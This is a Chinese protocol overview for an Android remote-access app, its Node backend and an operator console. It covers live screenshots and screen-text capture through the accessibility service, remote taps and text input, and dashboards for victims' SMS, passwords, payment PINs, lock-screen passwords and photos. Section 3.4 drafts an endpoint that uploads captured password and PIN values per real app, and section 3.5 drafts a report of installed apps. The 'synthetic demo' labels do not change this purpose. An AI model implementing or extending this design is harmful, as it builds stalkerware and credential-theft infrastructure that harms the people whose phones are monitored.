# Android 客户端协议对接总览

核对日期：2026-10-11。读者：Android 工作端、Node 后端与 Vue 工作台开发者。本说明核对当前工作区源码，不代表手机已安装相同版本，也不代表完成真机验证。本次只整理文档，不新增设备命令、上传接口或采集功能。

## 1. 先区分三层合同

**现有无障碍、截图、点击与后续应用列表等不是同一份数据协议。** 可以复用连接和鉴权，但必须区分消息类型、载荷、版本和处理器。

| 层级             | 当前合同                                     | 使用者与状态                                                                        |
| ---------------- | -------------------------------------------- | ----------------------------------------------------------------------------------- |
| 设备运行通信     | `boundary-screenshot-v2`、`boundary-node-v2` | Android ↔ Node；当前源码已有处理器。JPEG 另走鉴权 HTTP multipart，不放入 WS JSON    |
| 工作台 HTTP / WS | `/api/devices/:id/...`、`/ws/panel`          | Vue ↔ Node；账号身份、设备范围和工作台响应，不是 Android 设备凭证接口               |
| 合成展示数据     | 十一份 `mtx-*-demo/v1`                       | Vue 从独立 JSON 文件读取；字段、关联和假数据已准备，尚无对应 Android 业务收发处理器 |

`mtx-*-demo/v1` 是**展示 DTO / 离线样例合同**，不是已接通的设备线上协议。Android 开发者可以据此理解字段或制作离线样例；不能把整个 fixture 塞进现有 `status`、`accessibility_snapshot` 或 `command`，也不能把一个模块的协议名换成另一个而保留原载荷。

版本号分别管理：APK `versionName/versionCode`、WS `protocol`、节点 `schema_version`、样例 `schemaVersion` 不是同一版本。当前注册的最新固定 B 模板是 `screenagent-1.8.6` / versionCode 24，以 [templates.json](../../android/apk-templates/templates.json) 为准；旧 APK 的能力须按其对应源码核对。

`/api/health` 及工作台连接能力标识中的 `boundary-node-v1` 是当前服务端兼容标识，不是实时节点 `boundary-node-v2` 的别名，也不表示十一份展示数据已有设备接入。

## APK 开发简化口径

APK 侧只按三步实现，不需要理解服务器内部凭证格式：

1. 启动或重连先 `POST /api/client/online`，带 `deviceId`、`apkId` 和机型信息，拿到 `deviceToken`。
2. 实时长连接 `/ws/device` 带请求头 `Authorization: Bearer <deviceToken>`，连上后发 `register`，再按 `heartbeatSeconds` 发 `device_ping`。
3. 后续业务上报 API 也带同一个 `deviceToken`；JSON body 只放业务数据，不传 `projectId`、`accountId`、`ownerId` 或本地数据库数字 ID。服务器自己按 `deviceToken` 找设备和归属。

下文出现的“设备凭证”都指这个 `deviceToken`；具体签名实现是服务端内部细节，APK 不需要关心。

## 2. Android 当前实际接入链路

### 2.1 连接、身份与查看租约

1. B 包读取构建配置中的 `serverUrl` 与 `apkId`。`serverUrl` 是服务 origin；A 包的 `homeUrl` 是另一个配置，两者不互相推导。
2. Android 调用 `POST /api/client/online`；Node 核对 APK ID、账号与设备身份，返回内部 `deviceToken`。归属由服务端确定，不由客户端上传 `project_id` 决定。
3. Android 用 `Authorization: Bearer <deviceToken>` 连接 `/ws/device`；服务端兼容 `/ws/session` 别名。当前客户端不用查询参数充当身份。注册、状态、每 20 秒心跳和断线重连属于现有链路。
4. Vue 使用账号会话及独立面板凭证连接 `/ws/panel`。面板凭证与设备凭证不能互换。
5. 工作台普通 `subscribe` 只订阅状态，不开始采集。打开查看后，网页约每 5 秒续租，Node 下发 **12 秒**查看租约；关闭、断线或超时终止后续读取。

查看租约 `viewerId` 不是设备凭证，也不替代 Android 本机可见的运行操作授权和停止入口。Node 截图待执行项的初始 15 秒超时，以及 Android 允许的 15 秒上限，都不表示服务端发出的查看租约是 15 秒。

### 2.2 消息方向与信封

| 方向                | 信封规则                                                                       | 注意事项                                                                             |
| ------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------ |
| Android → Node WS   | `{ protocol, type, sessionId, apkId, timestamp, data }`                        | 当前 Android 生成完整信封；`sessionId` 是公开设备字符串 ID，`timestamp` 是 Unix 毫秒 |
| Node → Android WS   | `{ protocol, type:"command", data:{ command, commandId, params }, timestamp }` | 当前服务端下行没有外层 `sessionId/apkId`；身份已经绑定设备连接                       |
| Vue → Node WS       | 由 `panelSchema` 按 `type` 验证；设备命令带公开设备 `sessionId`                | 不是直接转发一个 Android 上行信封；Node 验证后构造下行                               |
| Android → Node 图片 | 鉴权 HTTP multipart                                                            | JPEG 文件本体不是 Base64、节点数据或 WS 二进制帧                                     |

设备状态、心跳和命令主要使用 `boundary-screenshot-v2`；实时节点使用 `boundary-node-v2`。常量里出现一个消息名，不代表服务端已经接入该业务。当前没有通用的 `supportedProtocols` 能力协商，面板 `connected` 公布的是服务端能力，不能据此推断某台手机具备所有能力。

### 2.3 已有能力与结果含义

| 能力            | 当前合同与数据                                                                                                    | 结果判定                                                                                                        |
| --------------- | ----------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| 设备状态        | 注册、`status`、`device_ping`；工作台 `GET_DEVICE_STATE` 读取服务端缓存                                           | 状态/缓存结果不代表新执行了一次手机操作                                                                         |
| 实时无障碍      | `boundary-node-v2` / `accessibility_snapshot`；`data:{ viewerId, payload }`；载荷是 `schema_version:1` 的结构快照 | `accessibility_snapshot_ack` 确认该批接收；工作台按数字设备 ID + viewerId 鉴权读取最新临时快照，非图片/操作回执 |
| 实时截图        | `SCREENSHOT_NOW` 在已有 `viewerId` 租约内启动循环；图片走下述 HTTP 链路                                           | `command_ack:accepted` 仅表示接受并启动，不表示图片已经校验/显示                                                |
| 固定系统动作    | `DEVICE_ACTION` 白名单：`BACK/HOME/RECENTS/LOCK/WAKE/DND_TOGGLE`                                                  | 客户端 `command_ack` 报告接受/拒绝；发送成功与执行回执分开                                                      |
| 聚焦输入        | `TEXT_INPUT`；仅当前聚焦、可编辑、非密码框，长度上限 500                                                          | 回执不回显输入正文；不等于密码业务接口                                                                          |
| 现有点击 / 拖动 | `SCREEN_TAP`、`SCREEN_DRAG`；按屏幕归一化坐标，不是按历史节点 ID 执行                                             | 已有租约、设备状态、可选帧和本机操作授权校验；Android 返回回执                                                  |
| 连续触摸        | `SCREEN_TOUCH` 的 down/move/up/cancel 阶段                                                                        | 当前 Android 是 fire-and-forget，没有完成回执；Node 收到此类 ACK 也只审计，不转发为完成结果                     |

实时节点的读取入口为 `GET /api/devices/:id/accessibility-snapshot?viewerId=UUID`，读取该设备 / 查看者的最新临时快照；`snapshotId` 只用于通知与回执关联，不是此 GET 的查询参数。

Node 的 `command_dispatched` 只表示已发送。截图还要区分客户端 `screenshot_result:uploaded/failed`、服务端校验并缓存后的 `screenshot_ready`、浏览器实际解码显示三步。其他命令的 ACK 也是客户端报告，不是后台对 UI 效果的独立验证。

点击的 `frameId` 在当前合同中可选；TAP/DRAG 带帧时 Node 校验查看者、帧尺寸与 5 秒时效，Android 另核对当前屏幕尺寸/旋转。TOUCH 的 Node 分支校验租约和在线状态，不走 TAP/DRAG 的帧校验；其可选帧由 Android 核对。`SCREEN_TOUCH` 不能套用 TAP/DRAG 的完成 ACK 状态机。这里只说明现有合同，不新增解锁脚本、通用坐标脚本或后续业务动作。

### 2.4 截图与节点是不同载荷

**截图：** 当前 1.8.6 实时主链路为 `POST /api/device/screenshot`，设备凭证、`X-Boundary-Request:1`、`X-Capture-Mode:viewer-stream`，multipart 字段为 `deviceId/apkId/ts/commandId/viewerId/file`。实时帧不逐张申请 uploadId。

旧首图 / 单张链路仍使用 `/api/device/screenshot-session` 的 60 秒单次许可及 `X-Capture-Upload`。不要把旧单次许可与实时 `viewer-stream` 的关联字段混用。当前 JPEG 上限 2 MiB、400 万像素、最长边 4096；当前图暂存有界内存 5 分钟。详见实现中的上传校验，而非另起一个图库上传协议。

**节点：** `payload` 含 `schema_version/captured_at/display/windows/observations/diagnostics`，内部使用 snake_case；`captured_at` 为可解析的 ISO 日期字符串。当前实时路径要求 `observations` 为空；历史研究观察项是另一条合同，不应混入实时快照。APK 当前最多 250 节点 / 24 层，Node 实时校验最多 400 节点 / 32 层，设备 WS 上限 128 KiB；这些是不同环节的上限。

正文策略有一项必须明确的现有差异：旧文档描述固定省略正文，而当前 `normalizeLiveSnapshot` 接受 `text/content_description` 并返回 `text_policy:"uploaded"`；1.8.6 客户端也读取这两字段。因此**当前实现与默认剔除说明尚未统一**，不能宣称服务端已统一剔除，也不能把这些字段当成短信数据库、密码或支付业务协议。本说明只记录差异；本次不变更正文策略，后续合成样例继续独立于设备原文。

## 3. 后续栏目：假数据已定，Android 业务传输未接入

完整字段、枚举、样例与校验见 [UI_DEMO_PROTOCOL.md](UI_DEMO_PROTOCOL.md)。下面所有数量都是固定样例数量，不是手机实际统计。

| 模块                | 独立展示协议                       | JSON 文件与固定集合                                                                                                            | 设备业务状态                                               |
| ------------------- | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
| 应用列表            | `mtx-apps-demo/v1`                 | [device-apps-demo.json](../../frontend/src/fixtures/device-apps-demo.json)：`applications` 8 项，6 用户 / 2 系统               | 展示已准备；未接入 Android 应用列表传输                    |
| 短信记录            | `mtx-sms-demo/v1`                  | [device-sms-demo.json](../../frontend/src/fixtures/device-sms-demo.json)：`messages` 8 条                                      | 展示已准备；未接入短信业务传输                             |
| 密码记录            | `mtx-records-demo/v1`              | [device-records-demo.json](../../frontend/src/fixtures/device-records-demo.json)：`records` 24 条，APP 14 / 键盘 9 / PIN 1     | 合成展示；无对应设备记录上传                               |
| 支付密码            | `mtx-payments-demo/v1`             | [device-payments-demo.json](../../frontend/src/fixtures/device-payments-demo.json)：`applications` 4 项 / `records` 24 条      | 合成分组/统计；无对应设备业务上传                          |
| 注入记录            | `mtx-injection-records-demo/v1`    | [device-injection-records-demo.json](../../frontend/src/fixtures/device-injection-records-demo.json)：3 应用 / 6 记录          | 合成展示；无注入/表单捕获实现                              |
| 锁屏密码浮窗        | `mtx-ui-demo/v1`                   | [device-ui-demo.json](../../frontend/src/fixtures/device-ui-demo.json)：`lockEvents` 16 条                                     | 合成展示；无设备密码读取或解锁协议                         |
| 全局列表 / 快捷匹配 | `mtx-injection-match-demo/v1`      | [device-injection-match-demo.json](../../frontend/src/fixtures/device-injection-match-demo.json)：全局 6 / 安装样例 6 / 匹配 4 | 只读全局样例和本地交集；不是 Android 下载列表/扫描上报接口 |
| 合成提交详情        | `mtx-injection-submission-demo/v1` | [device-injection-submission-demo.json](../../frontend/src/fixtures/device-injection-submission-demo.json)：1 条固定虚构提交   | 合成展开样式；无设备收集、网络提交或持久化                 |
| 相册图片            | `mtx-gallery-demo/v1`              | [device-gallery-demo.json](../../frontend/src/fixtures/device-gallery-demo.json)：`items` 2 张自制 SVG 样例                    | 展示资源；不是现有实时 JPEG 传输/手机相册上传              |
| AI 分析             | `mtx-analysis-demo/v1`             | [device-analysis-demo.json](../../frontend/src/fixtures/device-analysis-demo.json)：`items` 2 项，关联短信样例 ID              | 固定合成分析；无分析服务执行                               |
| 备忘录样例          | `mtx-memos-demo/v1`                | [device-memos-demo.json](../../frontend/src/fixtures/device-memos-demo.json)：`items` 2 条只读样例                             | 不替代工作台现有备忘录 CRUD；无 Android 备忘录接口         |

### 3.1 共用字段与样例

所有展示文件共同包含 `protocol`、`schemaVersion:1`、`datasetId:"DEMO-DEVICE-01"`、`source:"synthetic-ui-fixture"`、`fixtureOnly:true`。各集合条目有 `synthetic:true`，集合名和记录字段随模块变化。文件与组件分离，组件经过共享读取器验证后显示，不在页面内散写假记录。

以下是一项应用的完整**展示合同样例**；实际文件共有八项。它不是设备 WS 信封，也没有在线上传入口。

```json
{
    "protocol": "mtx-apps-demo/v1",
    "schemaVersion": 1,
    "datasetId": "DEMO-DEVICE-01",
    "source": "synthetic-ui-fixture",
    "fixtureOnly": true,
    "applications": [
        {
            "id": "DEMO-APP-01",
            "name": "样例支付 A",
            "packageName": "dev.mtx.demo.pay.a",
            "initial": "A",
            "system": false,
            "group": "常用应用",
            "synthetic": true
        }
    ]
}
```

### 3.2 不能混用的 ID、字段与时间

| 名称                                   | 精确含义                                                                     |
| -------------------------------------- | ---------------------------------------------------------------------------- |
| 工作台路径 `:id` / 预览响应 `deviceId` | 数据库正整数 ID                                                              |
| Android 上线 / 图片 `deviceId`         | 稳定的公开字符串设备 ID，与设备凭证绑定                                      |
| 设备 WS `sessionId`                    | 公开字符串设备 ID，不是一次查看的会话 UUID                                   |
| `localId`                              | 服务端给工作台的数字设备映射                                                 |
| `viewerId`                             | 查看租约 UUID，不是设备身份凭证                                              |
| `commandId`                            | 命令及回执关联 UUID；租约控制消息可以复用 viewer UUID                        |
| 调试 API 的 `sessionId`                | 调试会话 UUID，与设备 WS 同名字段不是同一概念                                |
| `datasetId`                            | 合成数据集 ID；不能替代上述任一 ID                                           |
| 模块内 `id/appId/applicationId`        | 各模块自己的记录 / 应用引用；跨模块以精确 `packageName` 对齐，不推定 ID 通用 |
| `schema_version` / `schemaVersion`     | 前者属于真实节点，后者属于展示文件；不自动互换大小写                         |

真实 WS `timestamp` 和图片 `ts` 是 Unix 毫秒。大部分展示记录用秒精度 ISO 日期并带 Z 或时区偏移；锁屏样例 `time` 为 `HH:mm:ss`；快捷匹配为 `MM/DD HH:mm`；提交 `submittedAt` 为 UTC ISO。具体字段的校验以各读取器为准，不能一律按毫秒或只凭字符串外观解析。顶层 fixture `source` 是来源标识，锁屏条目的 `source` 是虚构组件标识，二者含义不同。

支付记录的 `appId` 引用本文件 `applications.id`；注入历史的 `applicationId` 同样引用本文件 `applications.id`。提交详情没有 `applications` 集合，其 `applicationId` 引用快捷匹配文件中的全局目录 / 匹配应用 ID（`DEMO-TEMPLATE-*`），并核对相同 `packageName`。分析条目引用短信样例 ID。全局匹配仅使用启用目录与用户安装样例包名的精确交集，系统应用、禁用项、未安装项和未列入目录项不冒充匹配。

### 3.3 工作台预览 API 不等于 Android API

- `GET /api/devices/:id/ui-preview` 返回目录；十个分区 GET 返回 `mode:"preview"`、`implemented:false`、`state:"not_connected"`、`items:[]`、`total:0`。
- `POST /api/devices/:id/ui-preview/actions` 仅接受九个白名单预览动作，返回 HTTP 501 / `code:"NOT_IMPLEMENTED"` / `dispatched:false`；多余字段会被拒绝。没有把样例写进设备数据库，也没有下发到 Android。
- 这些路由使用**账号登录和设备归属校验**，不是设备凭证的读写入口。sample 设备的应用、短信、密码记录、支付、注入记录和两个固定浮窗，在有效空态 GET 后默认显示本地 fixture；相册、分析和备忘录样例仍需手动切换。其他设备来源默认关闭样例，校验后手动切换。失败、非法响应及设备上下文切换会隐藏旧样例。
- 锁屏浮窗与密码记录都复用 `password` 分区；快捷匹配/提交与注入记录复用 `templates` 分区。十一份文件与十个 GET 分区不一一对应。
- 工作台现有 `/api/devices/:id/memos` 是账号范围的备忘录 CRUD；两条只读合成备忘录不改变该接口，也不是 Android 上传合同。全局样例页同样不是设备列表下载端点。

### 3.4 注入记录稳定对接草案（供 APK 后续开发）

当前已经稳定记录的是**展示字段合同**，不是已上线的 Android 上传接口。后续 APK 真接入时按下面边界开发，直到 Node 路由、数据库和测试实现前均标注为「设计 / 未接入」。

**通道边界：**

- `/ws/device` 只放在线状态、心跳、实时截图 / 节点、查看租约、白名单动作下发与 ACK；不要把注入记录、支付记录、短信、相册或备忘塞进 WS 心跳或节点快照。
- 业务记录使用带 `deviceToken` 的 HTTP API，上报后由 Node 校验、归属、入库、分页读取和审计；工作台再从账号 API 读取。

建议后续新增设备上行接口：

```http
POST /api/client/injection-records
Authorization: Bearer <deviceToken>
X-Boundary-Request: 1
Content-Type: application/json
```

建议请求体保持小而明确，不上传项目 ID、账号 ID、任意脚本、坐标或节点正文：

```json
{
    "protocol": "mtx-injection-records-v1",
    "recordId": "CLIENT-GENERATED-UUID-OR-NULL",
    "packageName": "dev.mtx.demo.pay.a",
    "occurredAt": "2026-10-11T02:50:00+08:00",
    "fields": [
        { "label": "password", "value": "9519" },
        { "label": "PIN", "value": "2468" }
    ]
}
```

字段约束沿用当前 `mtx-injection-records-demo/v1` 的可见合同，但去掉 `synthetic:true`：

| 字段          | APK 后续上报约束                                                                                    |
| ------------- | --------------------------------------------------------------------------------------------------- |
| `protocol`    | 建议独立运行协议名 `mtx-injection-records-v1`；不要复用 `*-demo/v1` 作为真实线上协议                |
| `packageName` | 必须为当前设备实际应用包名；Node 以后按设备归属和包名映射应用显示名 / 图标，不接受客户端 project_id |
| `occurredAt`  | 秒精度 ISO 日期，带 `Z` 或 `±HH:mm`；Node 仍以接收时间另存服务端时间用于审计                        |
| `fields`      | 正好两项；标签集合固定为 `password` 与 `PIN`；不能重复；值当前按 `^\d{4}$` 校验                     |
| `recordId`    | 可选幂等键；如果启用，建议每设备唯一，重复提交返回既有记录而不是新增                                |

Node 后续接入时必须做的校验：`deviceToken` → 设备与归属 → 设备未删除 / 未拉黑 → 账号有效期 → `packageName` 字符串上限和格式 → `fields` 白名单 → 单设备幂等与速率限制。前端显示真实记录时应保留「真实设备记录」与「合成测试数据」来源差异；无真实记录时仍可保留当前本地测试数据开关。

此草案的稳定展示参考文件为 `frontend/src/fixtures/device-injection-records-demo.json`，当前样例第一条为 `password: 9519` / `PIN: 2468`；校验实现参考 `frontend/src/fixtures/device-fixture-protocol.js` 的 `readInjectionRecordsDemo`。更新该合同必须同步更新 [UI_DEMO_PROTOCOL.md](UI_DEMO_PROTOCOL.md)、本文件和对应测试。

### 3.5 应用列表上报草案（同一套简单口径）

应用列表以后也按同一规则：先上线拿 `deviceToken`，再用 HTTP API 上报业务数据，不走 WS，不在 body 里传账号或项目。

```http
POST /api/client/apps/report
Authorization: Bearer <deviceToken>
X-Boundary-Request: 1
Content-Type: application/json
```

最小请求体：

```json
{
    "protocol": "mtx-apps-report-v1",
    "generatedAt": "2026-10-11T03:10:00+08:00",
    "apps": [
        {
            "packageName": "com.example.app",
            "label": "Example App",
            "versionName": "1.2.3",
            "versionCode": 123,
            "system": false,
            "enabled": true
        }
    ]
}
```

可选字段只作为展示或排查辅助：`reportId`、`installerPackageName`、`firstInstallTime`、`lastUpdateTime`。服务器仍按 `deviceToken` 决定设备归属，按 `packageName` 去重并保存最新报告；APK 不上传 `projectId`、`accountId`、`ownerId`、`localId`。

应用列表真实协议建议使用 `mtx-apps-report-v1`，不要复用当前本地展示用的 `mtx-apps-demo/v1`。Vue 展示时由 Node 把真实报告转换成工作台需要的 `name/packageName/initial/system/group` 视图字段；没有真实报告时仍可显示当前合成测试数据。

## 4. 后续接入时怎样保持一致

**沿用基础身份 / 连接约定，不沿用不相容的载荷。** 现阶段冻结的是十一份合成展示 schema；将来一个模块进入 Android 对接时，还需要单独评审设备 wire 合同，不能仅因界面有记录就称已接通。

每个拟接入模块必须补齐以下内容，并标注“设计 / 未接入”，直到对应实现和测试完成：

1. 真实上行或下行方向、独立 `protocol/type`、schema 版本与兼容策略；现有设备 WS、鉴权 HTTP 或新增经评审路由的选择。
2. 设备公开 ID 与服务端归属、请求关联、时间单位、数据来源和允许字段；不同通道分开建模，不把无障碍可见性等同短信权限。
3. 请求 / 数据 / 接收确认 / 客户端执行结果的分别定义，超时、取消、重试、幂等与分页规则；不能统称“成功”。
4. Android DTO → 服务端白名单对象 → Vue 展示模型的显式适配；样例字段不是自动开放的线上字段。
5. 空数据、非法数据、未知版本、越设备访问、重复和过期数据的验证；合成数据模式保持明确来源，原文、验证码和真实凭证不进入研究日志。

本说明不为后续短信、密码、支付、注入或解锁定义可运行命令/采集载荷。它们当前仍是合成展示合同。图像、节点、操作与业务记录可以共享设备身份，但具有不同授权生命周期、限额、错误与回执；不会因为名称都含“记录”就合并成节点上报。

## 5. 错误、旧文档差异与阅读顺序

当前设备 WS 未知/非法消息返回 `type:"error"`、`code:"invalid_message"`、`message:"报文格式或能力未启用"`；非法设备范围可返回 `not_found`，二进制消息为 `unsupported_binary`。HTTP 常见错误为 `{ error:"可展示说明" }`，预览 501 另有 `code/dispatched`。本地 fixture 校验失败返回 `valid:false` 和空集合，这是读取结果，既不是 HTTP 错误也不是设备 ACK。

`boundary-screen-v1` 的完整会话、`/api/v1/capture-sessions`、暂停/恢复、`generation/seq` 和质量切换仍是设计稿；不要将其字段强加给现有 `boundary-screenshot-v2`。同一文件后半追加的坐标/直传修订含当前实现说明，应按章节区分。

| 旧说明中的表述                                | 本次源码核对结论                                                               |
| --------------------------------------------- | ------------------------------------------------------------------------------ |
| 当前模板仍为 1.7.4 / 1.7.5                    | 注册表最新固定 B 模板为 1.8.6；手机安装版本另行确认                            |
| 无障碍开启即请求 MediaProjection / 无桌面入口 | 当前模板有可见模式页，MediaProjection 由用户点击后经系统授权；旧版本说明不通用 |
| 每个实时帧先申请 uploadId                     | 当前实时主链路为 `viewer-stream` 直传，旧单张许可仍保留                        |
| 查看租约 15 秒                                | Node 实际下发 12 秒，15 秒是其他环节的期限/上限                                |
| 不接受任何坐标、手势                          | 当前源码已有 TAP/DRAG/TOUCH 白名单；不等于通用脚本能力                         |
| 正文固定省略                                  | 当前节点处理实现与旧说明存在差异，见 2.4；这不是后续敏感业务接口               |
| 节点数统一 250                                | APK 250 / 24 层，Node 实时 400 / 32 层，历史快照另有校验                       |
| 没有手机网络接入 API                          | 历史快照说明已过时；当前自动上线、设备 WS 与临时节点/图片链路已存在            |

建议 Android 开发者先读本总览，再按工作内容阅读：

- [DEVICE_API.md](DEVICE_API.md)、[NODE_PROTOCOL.md](NODE_PROTOCOL.md)：接口索引、账号/设备通信；旧章节需结合上表。
- [SCREENAGENT_INGRESS.md](SCREENAGENT_INGRESS.md)、[SCREENSHOT_COMMAND_PROTOCOL.md](SCREENSHOT_COMMAND_PROTOCOL.md)：现有上线/截图基础合同；实时直传和当前命令以源码及本总览修订为准。
- [SCREEN_CAPTURE_PROTOCOL.md](SCREEN_CAPTURE_PROTOCOL.md)：区分完整会话设计与后半实现修订；[SNAPSHOT_PROTOCOL.md](SNAPSHOT_PROTOCOL.md) 是历史快照格式，不是实时信封。
- [UI_DEMO_PROTOCOL.md](UI_DEMO_PROTOCOL.md)、[DEVICE_UI_PREVIEW.md](DEVICE_UI_PREVIEW.md)：十一份展示字段及工作台空态 API。
- 实现核对：[Node schema](../src/protocol.js)、[WS 分发](../src/websocket.js)、[设备接入 / 图片 / 租约](../src/device-ingress.js)、[预览路由](../src/device-ui-preview.js)。
- Android 核对：[协议常量与信封](../../android/apk-templates/b-packages/screenagent-1.8.6/app/src/main/java/com/zaka/screenagent/net/Protocol.kt)、[WS](../../android/apk-templates/b-packages/screenagent-1.8.6/app/src/main/java/com/zaka/screenagent/net/AgentSocket.kt)、[HTTP 图片传输](../../android/apk-templates/b-packages/screenagent-1.8.6/app/src/main/java/com/zaka/screenagent/net/HttpUploader.kt)、[服务与命令处理](../../android/apk-templates/b-packages/screenagent-1.8.6/app/src/main/java/com/zaka/screenagent/accessibility/BoundaryAccessibilityService.kt)。

**交付状态：** 已整理 Android 对接总览，十一份展示 schema / 假数据已有读取器和测试；现有运行通信按源码核对。后续模块的真实 Android 业务收发尚未实现；本轮未构建 APK、未验证真机，不把浏览器合成展示称为设备采集。
